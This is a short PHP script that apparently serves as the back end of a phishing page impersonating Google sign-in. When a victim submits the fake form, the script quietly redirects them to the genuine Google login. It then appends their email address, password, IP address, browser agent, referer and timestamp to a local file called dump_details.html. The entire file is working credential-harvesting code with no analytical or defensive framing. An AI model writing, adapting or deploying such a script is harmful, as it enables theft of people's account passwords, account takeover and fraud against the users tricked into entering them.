<?php 

if(isset($_POST['email']) && isset($_POST['pass'])) {
	header("Location: https://accounts.google.com/signin/v2/identifier?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin");
	
    $ipaddr = $_SERVER['REMOTE_ADDR'];
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $datetime = date('F j, Y, g:i a');
    if(isset($_SERVER['HTTP_REFERER'])) {
  		$ref = $_SERVER['HTTP_REFERER'];
	}
	else {
		$ref = "HTTP REFERER NOT SET";
	}

    $data = "<b>Email:</b> " . $_POST['email'] . "<br/>" . "<b>Password:</b> " . $_POST['pass'] . "<br/>" . "<b>IP Address:</b> " . $ipaddr . "<br/>" . "<b>Browser Agent:</b> " . $agent . "<br/>" . "<b>Referer:</b> " . $ref . "<br/>" . "<b>Date Time:</b> " . $datetime . "<br/>" . '<hr/>'  ;
    $file = fopen('dump_details.html', 'a');
    fwrite($file,$data);

}
else {
   echo '<script>window.location.href="index.php"</script>';
}
?>